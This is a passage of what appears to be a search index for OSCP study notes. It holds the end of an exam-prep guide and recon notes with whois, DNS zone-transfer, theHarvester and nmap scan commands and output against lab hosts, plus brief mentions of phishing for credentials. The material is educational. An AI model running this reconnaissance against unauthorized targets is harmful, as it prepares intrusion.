check if I could obtain a shell from them. You could also create a Windows 7 64-bit system as well but some of 32-bit applications may not work properly as they would on an actual 32-bit system. This practice is great to implement in case you are stuck on a windows system that is running a service that for some reason you cannot obtain a shell on.","title":"Setting up your Pentesting Environment"},{"location":"oscp/#wargameshands-on_challenges","text":"I know I stated theses before but I am going to reiterate this: OverTheWire Bandit: A good set of fun Linux challenges to get yourself familiarizes with bash and Linux. Abatchys walkthrough really helped me here: Bandit 1-5: https://www.abatchy.com/2016/10/overthewire-bandit-0-5 Bandit 6-10: https://www.abatchy.com/2016/10/overthewire-bandit-6-10 Bandit 11-15: https://www.abatchy.com/2016/10/overthewire-bandit-11-15 Bandit 16-20: https://www.abatchy.com/2016/10/overthewire-bandit-16-20 Bandit 21-26: https://www.abatchy.com/2016/10/overthewire-bandit-21-24 OverTheWire Natas: A good set of simple web application challenges. These challenges will help you understand the basics you need to identify issues in web applications. Check out this walkthrough here: https://infamoussyn.wordpress.com/2014/02/05/overthewire-natas-level-0-16-writeup-updated/ UndertheWire: Probably my favorite place for challenges because they contain a huge set of PowerShell challenges. You can find their challenges here: http://www.underthewire.tech/wargames.htm Root-me.org: A huge place that has challenges for almost everything in cybersecurity. For instance, you will see challenges in the following areas: Network Forensics (Packet Analysis, Captured Traffic, Network Services) Programming (C, PHP, Java, Shell-coding) Reverse Engineering (disassemble applications) Web Applications and Client Challenges. Forensic Challenges. Spend a few minutes going through some of these! SANS Holiday Hack Challenges: https://www.holidayhackchallenge.com/past-challenges/","title":"Wargames/Hands-on Challenges"},{"location":"oscp/#capture_the_flag_competitions_ctfscyber_competitions","text":"I know some of you are reading this are probably skeptical on why I added this\u2026well to be honest the cybersecurity careers that we are in are not a normal 7am-3pm job\u2026it is a lifestyle. I understand for many of us that it is hard to set some time to do all of the things in this field and that is totally OK! If you have the time or if you already can, set some time out of your busy schedule to do a CTF. Go ahead and hack all of the things that many of these CTFs provide as challenges. Trust me you will learn some cool things in a CTF that not even a class may be able to teach you. Personally, competing in CTFs did help me in this course and also it gave me a better understanding of what things I should be looking for instead of jumping into rabbit holes! Also do not be scared to compete in a CTF if it is your first time! Everyone has to start somewhere in their journey you just have to keep pushing forward. So, go out there and find some CTFs whether they are local to you or online make some time and have confidence in doing them. If you cannot find any local CTFs check out CTFTime for online competitions that you can participate in. A lot of the cyber competitions in the past few years really helped me build my skills and I still go out once in awhile to find a CTF to compete in for fun \ud83d\ude0a.","title":"Capture the Flag Competitions (CTFs)/Cyber Competitions"},{"location":"oscp/#bug_bounty_programs","text":"A great place to practice your skills and to make some possible profit as well! There are many bug bounty programs like Bugcrowd and Hackerone that you can participate for free. If you have never participated in bug bounty before check out Bugcrowd University as they provide a vast amount of material and resources to help you get started: https://www.bugcrowd.com/university/","title":"Bug Bounty Programs"},{"location":"oscp/#vulnerable_machines","text":"Boot-to-Root Vulnerable Machines! These machines are excellent to help you build your skills for pentesting. There are places where you can download them and run them on your system to begin practice or places where you can connect to their range and start hacking into the targets they have. Most of them result in obtaining root or Administrative/System level access in the end. Personally, my two favorite places are Hackthebox and Vulnhub.","title":"Vulnerable Machines"},{"location":"oscp/#hackthebox","text":"An online penetration testing platform that contains a variety of machines to help you improve your penetration testing skills. For those who have not gone through the registration you will need to pass a challenge to generate yourself an activation code. Once you have generated your activation code, then you will have the ability to access their range. In the free tier you are allowed to play with the 20 active machines they have and they cycle a new system in the range every week and retire an old one there as well. If you want to access to their retired machines you will have to get VIP access. It is a very affordable in my opinion, and worth it to invest in. If you do not have the funds to invest into Hackthebox, do not worry because you can certainly find these walkthroughs online (once the boxes are retired). One place I would definitely recommend to look at is IppSec Hackthebox Walkthroughs on YouTube! I love watching his videos because he goes through step by step on how to obtain access onto the target and how to escalate your privileges to obtain root access. Each box has a different scenario and IppSec always has something extra to throw in when he is doing his walkthroughs. With that being said I created a list of all of boxes that I did in Hackthebox that I thought were OSCP Like. You can find them here and also check out IppSec playlist he created from the list I recommended to start watching! I will continue to be updating this list in the future, and if you would like to keep it around you can find it here and on NetSecFocus: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159 HTB Boxes to Prepare for OSCP (Youtube Playlist): https://www.youtube.com/playlist?list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf I want to give a huge thanks to ch4p and g0blin for starting Hackthebox! I am glad that I got to talk to you guys and I am grateful that we were able to help you guys out. I look forward to seeing you guys grow and will soon submit a box for you guys in the future!","title":"Hackthebox:"},{"location":"oscp/#vulnhub","text":"Just like Hackthebox, except you have to download the vulnerable machines and run them on your local system. You will need VMware or VirtualBox (I recommend VMware workstation) to run these vulnerable systems. Please make sure that you are running these vulnerable systems on an isolated network and not on a public network. Thanks to g0tmi1k and his team for hosting this site and to the creators who submit these vulnerable machines. I have also created a list of vulnhub machines that I have found to be OSCP-Like as well. You can find them here and on NetSecFocus: I will continue to update this list and if you would like a copy for review you can certainly find it here: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0 Rooting Vulnerable Machines is extremely important when you are preparing for PWK/OSCP because you can\u2019t depend on theoretical knowledge to pass. Improving your hands-on skills will play a huge key role when you are tackling these machines.","title":"Vulnhub:"},{"location":"oscp/#tips_to_participate_in_the_proctored_oscp_exam","text":"As of August 15 th , 2018, all OSCP exams have a proctored exam. This means that a student will be monitored by an Offensive Security staff member through a screen sharing and webcam service. If you would like to learn more about this new proctoring process you can find it here: https://www.offensive-security.com/offsec/proctoring/ Before I took my exam, I had to go through a variety of things to make sure I was prepared to take my 1 st attempt. Even with my preparation, I lost 30 mins of my actual exam time due to troubleshooting the applications for the proctor on my end. With that being said, here are my tips to help you guys prepare for the proctoring section when you are ready to take the exam: Make sure your system is able to meet the software/hardware requirements that offensive security provides in order to run these services. You can find that information here: https://support.offensive-security.com/proctoring-faq/ Test your webcam to make sure it works. If you do not have a webcam for your system you can also use a spare laptop that has a webcam and connect the webcam session onto that system. The ScreenConnect application needs to be running on your main system that you will be using to connect to your exam. You can use multiple monitors for the exam. Keep in mind that the proctor must be able to see them and that they are connected to your system. The proctor will notify you about how many screens they see and you will need to confirm them with the number monitors you are using. If you use a system that has a monitor and it is not connected to the ScreenConnect application, then you will not be able to use that monitor for the exam. Be prepared and log into your webcam and screenconnect sessions 30 mins before your exam. Proctors cannot provide any assistance during the exam. You can take breaks, a nap, or grab a cup of coffee during your exam. Just make sure you notify the proctor when you leave and when you return for your exam. Also be dressed for your exam. I think that is pretty simple to understand why. For any other questions you may have you can check out Offensive Security FAQ for Proctored Exams here: https://www.offensive-security.com/faq/","title":"Tips to participate in the Proctored OSCP exam"},{"location":"oscp/#other_resources","text":"NetSecFocus Learning Resources: https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=937533738","title":"Other Resources"},{"location":"oscp/#books","text":"Penetration Testing by Georgia Weidman. She also has a Cybrary Class: https://nostarch.com/pentesting Cybrary Class: https://www.cybrary.it/course/advanced-penetration-testing/ Kali Linux Revealed: https://www.kali.org/download-kali-linux-revealed-book/ Attacking Network Protocols: https://nostarch.com/networkprotocols Red Team Field Manual: https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504 Hash-Crack-Password-Cracking-Manual v3: https://www.amazon.com/Hash-Crack-Password-Cracking-Manual/dp/1793458618 The Hacker Playbook Series: https://securepla.net/hacker-playbook/ The Web Application Hacker Handbook: http://mdsec.net/wahh/ Violent Python: https://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579 Black Hat Python: https://nostarch.com/blackhatpython","title":"Books:"},{"location":"oscp/#courses_that_can_help_you_prepare_for_oscp","text":"eLearnSecurity: eLearnSecurity offers affordable security training and a large amount of labs that you can practice in their hera lab network. They have their own certifications as well that you can take. These are the following courses that I took to help me prepare for OSCP. Penetration Testing Student (PTS): https://www.elearnsecurity.com/course/penetration_testing_student/ Penetration Testing Professional (PTP): https://www.elearnsecurity.com/course/penetration_testing/ Web Application Penetration Testing (WAPT): https://www.elearnsecurity.com/course/web_application_penetration_testing/ SANS: SANS provides a wide variety of information security courses. Each of their courses are taught by very smart instructors who have been in this field for a very long time. However, these courses can be expensive if you are unable to get someone to pay for them. You can also try to apply for the SANS workforce training as well to be able to take their courses at a discount. I have taken most of the SANS course and I feel that the following courses below really helped me get a better understanding of what Pentesting is like in the actual field. Here are the courses that I would recommend if you are looking to prepare for OSCP. SANS 560: https://www.sans.org/course/network-penetration-testing-ethical-hacking SANS 542: https://www.sans.org/course/web-app-penetration-testing-ethical-hacking Pentesterlabs: A lot of web app pentesting material in this course: https://pentesterlab.com/ Pentester Academy: https://www.pentesteracademy.com/topics","title":"Courses that can help you prepare for OSCP:"},{"location":"oscp/#other_oscp_guides","text":"https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html https://411hall.github.io/OSCP-Preparation https://www.gitbook.com/book/sushant747/total-oscp-guide http://0xc0ffee.io/blog/OSCP-Goldmine https://h4ck.co/oscp-journey-exam-lab-prep-tips/ https://tulpa-security.com/2016/09/11/review-oscp-and-pwk/ http://niiconsulting.com/checkmate/2017/06/a-detail-guide-on-oscp-preparation-from-newbie-to-oscp/ Other Links: https://practicalpentestlabs.com/ https://immersivelabs.co.uk/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet https://maikthulhu.github.io/2017-11-20-onenote-layout","title":"Other OSCP guides:"},{"location":"oscp/#conclusion","text":"Welcome! You have arrived to the end of this journey (well not your OSCP journey if you decide to pursue it!). If you read this entire guide, I certainly give you props for doing so. If you read only parts of it, then I still give you props because the main thing that is important to me is that you learned something from it! I hope you are able to use my guide in your OSCP journey and are able to learn some new things, just like I did when I started mine. If this guide was able to help you let me know I want your feedback for sure. I thanked a lot of people for helping me with my journey in this guide and I want to thank them again for their time and contributions for helping me learn and grow in the cyber-security field. If anyone has any questions about this guide or feedback please let me know as you can reach out to me on twitter or on NetSecFocus! -TJNull Twitter: https://twitter.com/TJ_Null Github: https://github.com/tjnull Netsec Focus: Tjnull Hackthebox Discord AMA: https://www.youtube.com/watch?v=41DIav25Mp4 Bugcrowd: https://www.bugcrowd.com/researcher-spotlight-ambassador-tony-aka-tj-null/ P.S: Considering this journey as an extra mile, I am going to have to insist at this point for you to\u2026\u2026 Try Harder! -Offensive Security","title":"Conclusion"},{"location":"oscp/links/","text":"Prep Guide Fantastic resource - Netsec Focus OSCP Prep Guide OSCP Exam \u2013 Preparation, Exam Day & Report Day \u2013 vortex's blog Reviews My OSCP Journey | InfoSecurityGeek An Adventure to Try Harder: Tjnull\u2019s OSCP Journey | NetSec Focus Workflows OneNote Layout for Vulnhubs/CTFs Resources & Tools Buffer Overflows justinsteven/dostackbufferoverflowgood","title":"OSCP Links"},{"location":"oscp/links/#prep_guide","text":"Fantastic resource - Netsec Focus OSCP Prep Guide OSCP Exam \u2013 Preparation, Exam Day & Report Day \u2013 vortex's blog","title":"Prep Guide"},{"location":"oscp/links/#reviews","text":"My OSCP Journey | InfoSecurityGeek An Adventure to Try Harder: Tjnull\u2019s OSCP Journey | NetSec Focus","title":"Reviews"},{"location":"oscp/links/#workflows","text":"OneNote Layout for Vulnhubs/CTFs","title":"Workflows"},{"location":"oscp/links/#resources_tools","text":"","title":"Resources &amp; Tools"},{"location":"oscp/links/#buffer_overflows","text":"justinsteven/dostackbufferoverflowgood","title":"Buffer Overflows"},{"location":"oscp/recon/information-gathering/","text":"Goal of this phase is to learn about the targets as much as possible Knowledge gained in this phase will be used to develop plans of attack will be used for searching and verifying vulnerabilities Open Source Intelligence Gathering (OSINT) information is gathered from legal sources like public records / social media Netcraft a compmay that logs the uptime and make queries about the underlying software e.g query for bulbsecurity.com using this information basic attacks can be drafted / developed Rule out vulnerabilities that affect Microsoft IIS servers Try out social engineering attack (phishing message from godaddy) to get credentials WhoIs Lookups all domain registrars keep records of the domains they host contain certain information about the owner, including contact information to run WhoIs lookups, use the whois command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@kali:~# whois bulbsecurity.com Registered through: GoDaddy.com, LLC (http://www.godaddy.com) Domain Name: BULBSECURITY.COM Created on: 21-Dec-11 Expires on: 21-Dec-12 Last Updated on: 21-Dec-11 Registrant: \u2776 Domains By Proxy, LLC DomainsByProxy.com 14747 N Northsight Blvd Suite 111, PMB 309 Scottsdale, Arizona 85260 United States Technical Contact: \u2777 Private, Registration BULBSECURITY.COM@domainsbyproxy.com Domains By Proxy, LLC DomainsByProxy.com 14747 N Northsight Blvd Suite 111, PMB 309 Scottsdale, Arizona 85260 United States (480) 624-2599 Fax -- (480) 624-2598 Domain servers in listed order: NS65.DOMAINCONTROL.COM \u2778 NS66.DOMAINCONTROL.COM No 3 tells that the two DNS servers used. This site uses private registration else, a lot of details would have been shown DNS Reconnaissance Domain Name System (DNS) servers translate the human-readable url www.example.com into an IP address Nslookup to get the ip address / vice-versa from an url, use the nslookup command 1 2 3 4 5 6 7 8 root@Kali:~# nslookup www.bulbsecurity.com Server: 75.75.75.75 Address: 75.75.75.75#53 Non-authoritative answer: www.bulbsecurity.com canonical name = bulbsecurity.com. Name: bulbsecurity.com Address: 50.63.212.1 \u2776 nslookup returned the IP address of the domain above. mail servers can be found by looking for MX records (DNS speak for email) 1 2 3 4 5 6 7 8 9 10 11 12 root@kali:~# nslookup > set type=mx > bulbsecurity.com Server: 75.75.75.75 Address: 75.75.75.75#53 Non-authoritative answer: bulbsecurity.com mail exchanger = 40 ASPMX2.GOOGLEMAIL.com. bulbsecurity.com mail exchanger = 20 ALT1.ASPMX.L.GOOGLE.com. bulbsecurity.com mail exchanger = 50 ASPMX3.GOOGLEMAIL.com. bulbsecurity.com mail exchanger = 30 ALT2.ASPMX.L.GOOGLE.com. bulbsecurity.com mail exchanger = 10 ASPMX.L.GOOGLE.com. Nslookup says bulbsecurity.com is using Google Mail for its email servers Host Another utility for DNS queries is Host syntax: host -t ns <domain> 1 2 3 4 root@kali:~# host -t ns zoneedit.com zoneedit.com name server ns4.zoneedit.com. zoneedit.com name server ns3.zoneedit.com. --snip-- The above output shows all the DNS servers for the website. Zone Transfers DNS zone transfers allow name servers to replicate all the entries about a domain. many system administrators set up DNS zone transfers insecurely, so that anyone can transfer the DNS records for a domain use the l option to specify the domain to transfer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@kali:~# host -l zoneedit.com ns2.zoneedit.com Using domain server: Name: ns2.zoneedit.com Address: 69.72.158.226#53 Aliases: zoneedit.com name server ns4.zoneedit.com. zoneedit.com name server ns3.zoneedit.com. zoneedit.com name server ns15.zoneedit.com. zoneedit.com name server ns8.zoneedit.com. zoneedit.com name server ns2.zoneedit.com. zoneedit.com has address 64.85.73.107 www1.zoneedit.com has address 64.85.73.41 dynamic.zoneedit.com has address 64.85.73.112 bounce.zoneedit.com has address 64.85.73.100 --snip-- mail2.zoneedit.com has address 67.15.232.182 --snip- mail2.zoneedit.com is probably a mail server, so we should look for potentially vulnerable software running on typical email ports such as 25 (Simple Mail Transfer Protocol) and 110 (POP3). If we can find a webmail server, any usernames we find may lead us in the right direction so that we can guess passwords and gain access to sensitive company emails. Searching For Email Addresses One way to find usernames is by looking for email addresses on the Internet. a python tool called theHarvester can quickly scour thousands of search engine results for possible email addresses to look into the first 500 results in search engines for bulbsecurity.com use 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 root@kali:~# theharvester -d bulbsecurity.com -l 500 -b all ******************************************************************* * * * | |_| |__ ___ /\\ /\\__ _ _ ____ _____ ___| |_ ___ _ __ * * | __| '_ \\ / _ \\ / /_/ / _` | '__\\ \\ / / _ \\/ __| __/ _ \\ '__| * * | |_| | | | __/ / __ / (_| | | \\ V / __/\\__ \\ || __/ | * * \\__|_| |_|\\___| \\/ /_/ \\__,_|_| \\_/ \\___||___/\\__\\___|_| * * * * TheHarvester Ver. 2.2a * * Coded by Christian Martorella * * Edge-Security Research * * cmartorella@edge-security.com * ******************************************************************* Full harvest.. [-] Searching in Google.. Searching 0 results... Searching 100 results... Searching 200 results... Searching 300 results... --snip-- [+] Emails found: ------------------ georgia@bulbsecurity.com [+] Hosts found in search engines: ------------------------------------ 50.63.212.1:www.bulbsecurity.com --snip-- Maltego a data-mining tool designed to visualize open source intelligence gathering To run Maltego, run maltego at the command line. The Maltego GUI should launch. 1 root@kali:~# maltego Now select the Palette option from the left-hand border. As you can see, we can gather information about all sorts of entities. Let\u2019s start with the bulbsecurity.com domain Drag a Domain entity from the Palette onto the new graph. By default, the domain is paterva.com. To change it to bulbsecurity.com, either double-click the text or change the text field at the right side of the screen. Once the domain is set, you can run transforms. Right-click the domain icon and choosing Run Transform Maltego finds that www.bulbsecurity.com is an Apache web server with PHP, Flash, and so on, along with a WordPress install. Port Scanning finding which systems / services are active and which software to talk to Manual Port Scanning Exploiting the MS08-067 vulnerability can be an easy win for attackers and pentesters alike. To use this exploit, we need to find a Windows 2000, XP, or 2003 box with an SMB server that is missing the MS08-067 Microsoft patch available on the network. We can get a good idea about the network-based attack surface by mapping the network range and querying systems for listening ports. Port scanning can be done manually by connecting to ports with a tool such as telnet or netcat 1 2 3 4 5 6 7 8 root@kali:~# nc -vv 192.168.20.10 25 nc: 192.168.20.10 (192.168.20.10) 25 [smtp] open nc: using stream socket nc: using buffer size 8192 nc: read 66 bytes from remote 220 bookxp SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here nc: wrote 66 bytes to local The Windows XP box is running an SMTP server on port 25. After we connected, the SMTP server announced itself as SLMail -version 5.5.0.4433. Tip connecting to every possible TCP and UDP port on just one machine and noting the results can be time consuming. Port scanning tools such as NMap can be used to find listening ports Automated Port Scanning - NMap NMap is the industry standard for port scanning Note If NMap scan does not return any result, it is likely that intrusion detection systems / firewall have blocked the scan traffic A SYN Scan A SYN scan is a TCP scan that does not finish the TCP handshake. A TCP connection starts with a three-way handshake: SYN \u25b8 SYN-ACK \u25b8 ACK sequenceDiagram System1->>System2: SYN System2->>System1: SYN-ACK System1->>System2: ACK In a SYN scan, Nmap sends the SYN and waits for the SYN-ACK if the port is open but never sends the ACK to complete the connection. If the SYN packet receives no SYN-ACK response, the port is not available; either it\u2019s closed or the connection is being filtered. syntax: for a SYN scan is -sS flag syntax: for outputing in all formats use -oA flag this will output the reports in nmap, gnmap (greppable nmap) and in xml formats the reports can be imported in tools to read and analyze 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 root@kali:~# nmap -sS 192.168.20.10-12 -oA booknmap Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 07:28 EST Nmap scan report for 192.168.20.10 Host is up (0.00056s latency). Not shown: 991 closed ports PORT STATE SERVICE 21/tcp open ftp \u2777 25/tcp open smtp \u277a 80/tcp open http \u2778 106/tcp open pop3pw \u277a 110/tcp open pop3 \u277a 135/tcp open msrpc 139/tcp open netbios-ssn \u2779 443/tcp open https \u2778 445/tcp open microsoft-ds \u2779 1025/tcp open NFS-or-IIS 3306/tcp open mysql \u277b 5000/tcp open upnp MAC Address: 00:0C:29:A5:C1:24 (VMware) Nmap scan report for 192.168.20.11 Host is up (0.00031s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp \u2777 22/tcp open ssh 80/tcp open http \u2778 111/tcp open rpcbind 139/tcp open netbios-ssn \u2779 445/tcp open microsoft-ds \u2779 2049/tcp open nfs MAC Address: 00:0C:29:FD:0E:40 (VMware) Nmap scan report for 192.168.20.12 Host is up (0.0014s latency). Not shown: 999 filtered ports PORT STATE SERVICE 80/tcp open http \u2776 135/tcp open msrpc MAC Address: 00:0C:29:62:D5:C8 (VMware) Nmap done: 3 IP addresses (3 hosts up) scanned in 1070.40 seconds Note Port Service 69 TFTP - UDP port 80 HTTP Web Service 139 Remote Procedure Call A Version Scan SYN scan does not tell which software is listening on the open ports syntax: for nmap full TCP scan nmap -sT systax: for nmap version scan nmap -sV yeilds more data 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 root @ kali :~ # nmap -sV 192 . 168 . 20 . 10-12 -oA bookversionnmap Starting Nmap 6 . 40 ( http :// nmap . org ) at 2015-12-18 08 : 29 EST Nmap scan report for 192 . 168 . 20 . 10 Host is up ( 0 . 00046s latency ). Not shown : 991 closed ports PORT STATE SERVICE VERSION 21 / tcp open ftp FileZilla ftpd 0 . 9 . 32 beta 25 / tcp open smtp SLmail smtpd 5 . 5 . 0 . 4433 79 / tcp open finger SLMail fingerd 80 / tcp open http Apache httpd 2 . 2 . 12 (( Win32 ) DAV / 2 mod_ssl / 2 . 2 . 12 OpenSSL / 0 . 9 . 8k mod_autoindex_color PHP / 5 . 3 . 0 mod_perl / 2 . 0 . 4 Perl / v5 . 10 . 0 ) 106 / tcp open pop3pw SLMail pop3pw 110 / tcp open pop3 BVRP Software SLMAIL pop3d 135 / tcp open msrpc Microsoft Windows RPC 139 / tcp open netbios-ssn 443 / tcp open ssl / http Apache httpd 2 . 2 . 12 (( Win32 ) DAV / 2 mod_ssl / 2 . 2 . 12 OpenSSL / 0 . 9 . 8k mod_autoindex_color PHP / 5 . 3 . 0 mod_perl / 2 . 0 . 4 Perl / v5 . 10 . 0 ) 445 / tcp open microsoft-ds Microsoft Windows XP microsoft-ds 1025 / tcp open msrpc Microsoft Windows RPC 3306 / tcp open mysql MySQL ( unauthorized ) 5000 / tcp open upnp Microsoft Windows UPnP MAC Address : 00 : 0C : 29 : A5 : C1 : 24 ( Vmware ) Service Info : Host : georgia . com ; OS : Windows ; CPE : cpe :/ o : microsoft : windows Nmap scan report for 192 . 168 . 20 . 11 Host is up ( 0 . 00065s latency ). Not shown : 993 closed ports PORT STATE SERVICE VERSION 21 / tcp open ftp vsftpd 2 . 3 . 4 \u2776 22 / tcp open ssh OpenSSH 5 . 1p1 Debian 3ubuntu1 ( protocol 2 . 0 ) 80 / tcp open http Apache httpd 2 . 2 . 9 (( Ubuntu ) PHP / 5 . 2 . 6-2ubuntu4 . 6 with Suhosin-Patch ) 111 / tcp open rpcbind ( rpcbind V2 ) 2 ( rpc # 100000 ) 139 / tcp open netbios-ssn Samba smbd 3 . X ( workgroup : WORKGROUP ) 445 / tcp open netbios-ssn Samba smbd 3 . X ( workgroup : WORKGROUP ) 2049 / tcp open nfs ( nfs V2-4 ) 2-4 ( rpc # 100003 ) MAC Address : 00 : 0C : 29 : FD : 0E : 40 ( VMware ) Service Info : OSs : Unix , Linux ; CPE : cpe :/ o : linux : kernel Nmap scan report for 192 . 168 . 20 . 12 Host is up ( 0 . 0010s latency ). Not shown : 999 filtered ports PORT STATE SERVICE VERSION 80 / tcp open http Microsoft IIS httpd 7 . 5 135 / tcp open msrpc Microsoft Windows RPC MAC Address : 00 : 0C : 29 : 62 : D5 : C8 ( VMware ) Service detection performed . Please report any incorrect results at http :// nmap . org / submit / . Nmap done : 3 IP addresses ( 3 hosts up ) scanned in 20 . 56 seconds Note Keep in mind that Nmap may report the wrong version in some cases (for instance, if the software has been updated, but the welcome banner is not edited as part of the patch), but at the very least, its version scan gave us a good place to begin further research. UDP Scans Both Nmap\u2019s SYN and version scans are TCP scans that do not query UDP ports Scanning logic of UDP is different. Nmap sends a packet. If the port is open, the packet is received else, an ICMP Port Unreachable message is sent. sequenceDiagram Nmap->>system1: sends a packet system1-->>Nmap: packet received - no error - port open system1->>Nmap: ICMP error - port closed syntax: nmap -sU flag is used for UDP scan 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 root @ kali :~ # nmap -sU 192 . 168 . 20 . 10-12 -oA bookudp Starting Nmap 6 . 40 ( http :// nmap . org ) at 2015-12-18 08 : 39 EST Stats : 0 : 11 : 43 elapsed ; 0 hosts completed ( 3 up ), 3 undergoing UDP Scan UDP Scan Timing : About 89 . 42 % done ; ETC : 08 : 52 ( 0 : 01 : 23 remaining ) Nmap scan report for 192 . 168 . 20 . 10 Host is up ( 0 . 00027s latency ). Not shown : 990 closed ports PORT STATE SERVICE 69 / udp open | filtered tftp \u2776 123 / udp open ntp 135 / udp open msrpc 137 / udp open netbios-ns 138 / udp open | filtered netbios-dgm 445 / udp open | filtered microsoft-ds 500 / udp open | filtered isakmp 1026 / udp open win-rpc 1065 / udp open | filtered syscomlan 1900 / udp open | filtered upnp MAC Address : 00 : 0C : 29 : A5 : C1 : 24 ( VMware ) Nmap scan report for 192 . 168 . 20 . 11 Host is up ( 0 . 00031s latency ). Not shown : 994 closed ports PORT STATE SERVICE 68 / udp open | filtered dhcpc 111 / udp open rpcbind 137 / udp open netbios-ns 138 / udp open | filtered netbios-dgm 2049 / udp open nfs \u2777 5353 / udp open zeroconf MAC Address : 00 : 0C : 29 : FD : 0E : 40 ( VMware ) Nmap scan report for 192 . 168 . 20 . 12 Host is up ( 0 . 072s latency ). Not shown : 999 open | filtered ports PORT STATE SERVICE 137 / udp open netbios-ns MAC Address : 00 : 0C : 29 : 62 : D5 : C8 ( VMware ) Nmap done : 3 IP addresses ( 3 hosts up ) scanned in 1073 . 86 seconds Scanning A Specific Port By default, Nmap scans only the 1,000 ports it considers the most \u201cinteresting,\u201d not the 65,535 possible TCP or UDP ports. syntax: use the -p flag to scan specific ports 1 2 3 4 5 6 7 8 root@Kali:~# nmap -sS -p 3232 192.168.20.10 Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-18 09:03 EST Nmap scan report for 192.168.20.10 Host is up (0.00031s latency). PORT STATE SERVICE 3232/tcp open unknown MAC Address: 00:0C:29:A5:C1:24 (VMware) running a version scan against a specific port this may sometime crash the service but some information can be obtained In the process of crashing the listening service, Nmap can\u2019t figure out what software is running as noted at \u2776, but it does manage to get a fingerprint of the service. Based on the HTML tags in the fingerprint at \u2777, this service appears to be a web server. According to the Server: field, it is something called Zervit 0.4 \u2778. 1 2 3 4 5 6 7 8 9 10 11 12 13 root@kali:~# nmap -p 3232 -sV 192.168.20.10 Starting Nmap 6.40 ( http://nmap.org ) at 2015-04-28 10:19 EDT Nmap scan report for 192.168.20.10 Host is up (0.00031s latency). PORT STATE SERVICE VERSION 3232/tcp open unknown 1 service unrecognized despite returning data\u2776. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi : \u2777 SF-Port3232-TCP:V=6.25%I=7%D=4/28%Time=517D2FFC%P=i686-pc-linux-gnu%r(GetR SF:equest,B8,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Zervit\\x200\\.4\\r\\n\u2778X-Pow SF:ered-By:\\x20Carbono\\r\\nConnection:\\x20close\\r\\nAccept-Ranges:\\x20bytes\\ SF:r\\nContent-Type:\\x20text/html\\r\\nContent-Length:\\x2036\\r\\n\\r\\n <html> \\r\\ SF:n <body> \\r\\nhi\\r\\n </body> \\r\\n </html> \"); MAC Address: 00:0C:29:13:FA:E3 (VMware)","title":"Information Gathering"},{"location":"oscp/recon/information-gathering/#open_source_intelligence_gathering_osint","text":"information is gathered from legal sources like public records / social media","title":"Open Source Intelligence Gathering (OSINT)"},{"location":"oscp/recon/information-gathering/#netcraft","text":"a compmay that logs the uptime and make queries about the underlying software e.g query for bulbsecurity.com using this information basic attacks can be drafted / developed Rule out vulnerabilities that affect Microsoft IIS servers Try out social engineering attack (phishing message from godaddy) to get credentials","title":"Netcraft"},{"location":"oscp/recon/information-gathering/#whois_lookups","text":"all domain registrars keep records of the domains they host contain certain information about the owner, including contact information to run WhoIs lookups, use the whois command 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 root@kali:~# whois bulbsecurity.com Registered through: GoDaddy.com, LLC (http://www.godaddy.com) Domain Name: BULBSECURITY.COM Created on: 21-Dec-11 Expires on: 21-Dec-12 Last Updated on: 21-Dec-11 Registrant: \u2776 Domains By Proxy, LLC DomainsByProxy.com 14747 N Northsight Blvd Suite 111, PMB 309 Scottsdale, Arizona 85260 United States Technical Contact: \u2777 Private, Registration BULBSECURITY.COM@domainsbyproxy.com Domains By Proxy, LLC DomainsByProxy.com 14747 N Northsight Blvd Suite 111, PMB 309 Scottsdale, Arizona 85260 United States (480) 624-2599 Fax -- (480) 624-2598 Domain servers in listed order: NS65.DOMAINCONTROL.COM \u2778 NS66.DOMAINCONTROL.COM No 3 tells that the two DNS servers used. This site uses private registration else, a lot of details would have been shown","title":"WhoIs Lookups"},{"location":"oscp/recon/information-gathering/#dns_reconnaissance","text":"Domain Name System (DNS) servers translate the human-readable url www.example.com into an IP address","title":"DNS Reconnaissance"},{"location":"oscp/recon/information-gathering/#nslookup","text":"to get the ip address / vice-versa from an url, use the nslookup command 1 2 3 4 5 6 7 8 root@Kali:~# nslookup www.bulbsecurity.com Server: 75.75.75.75 Address: 75.75.75.75#53 Non-authoritative answer: www.bulbsecurity.com canonical name = bulbsecurity.com. Name: bulbsecurity.com Address: 50.63.212.1 \u2776 nslookup returned the IP address of the domain above. mail servers can be found by looking for MX records (DNS speak for email) 1 2 3 4 5 6 7 8 9 10 11 12 root@kali:~# nslookup > set type=mx > bulbsecurity.com Server: 75.75.75.75 Address: 75.75.75.75#53 Non-authoritative answer: bulbsecurity.com mail exchanger = 40 ASPMX2.GOOGLEMAIL.com. bulbsecurity.com mail 